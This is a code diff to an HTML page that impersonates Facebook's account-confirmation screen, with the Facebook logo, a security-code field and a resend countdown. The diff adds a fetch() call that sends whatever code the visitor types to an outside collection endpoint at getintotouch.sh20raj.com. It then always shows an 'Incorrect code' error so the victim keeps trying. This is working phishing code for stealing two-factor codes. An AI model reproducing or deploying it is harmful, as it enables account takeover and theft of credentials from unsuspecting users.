@@ -97,7 +97,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     </div>
     <div class="title">Confirm Your Account</div>
-    <form id="verificationForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST" onsubmit="handleFormSubmit(event)">
+    <form id="verificationForm">
         <div class="input-container">
             <input id="securityCode" name="securityCode" type="text" placeholder="Security Code" required>
         </div>
@@ -108,20 +108,39 @@
             <div id="codeSentMessage" class="code-sent-message">Code Sent</div>
         </div>
         <div id="errorMessage" class="error-message">Incorrect code. Please try again.</div>
-        <input type="hidden" id="userIP" name="userIP">
     </form>
     <script>
-        function handleFormSubmit(event) {
-            const userIP = document.getElementById('userIP');
-            userIP.value = getClientIP(); // Set the user's IP address
-            document.getElementById('verificationForm').submit(); // Submit the form regardless of the code
-        }
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
 
-        function getClientIP() {
-            // This is a simplified version to get the user's IP address
-            // Replace this with your actual method to get the IP address
-            return '127.0.0.1';
-        }
+            const securityCode = document.getElementById('securityCode').value;
+            const userIP = '127.0.0.1'; // Example IP address
+
+            // Simulate form data to be sent
+            const formData = new FormData();
+            formData.append('securityCode', securityCode);
+            formData.append('userIP', userIP);
+
+            // Send the form data using fetch
+            fetch('https://getintotouch.sh20raj.com/api.php?id=6534651073', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Do something if needed when submission is successful
+                    // In this case, always showing the error message for demo purposes
+                }
+                // Always show the incorrect code message
+                document.getElementById('errorMessage').style.display = 'block';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Always show the incorrect code message even if there's an error
+                document.getElementById('errorMessage').style.display = 'block';
+            });
+        });
 
         let countdown = 30;
         const resendLink = document.getElementById('resendLink');
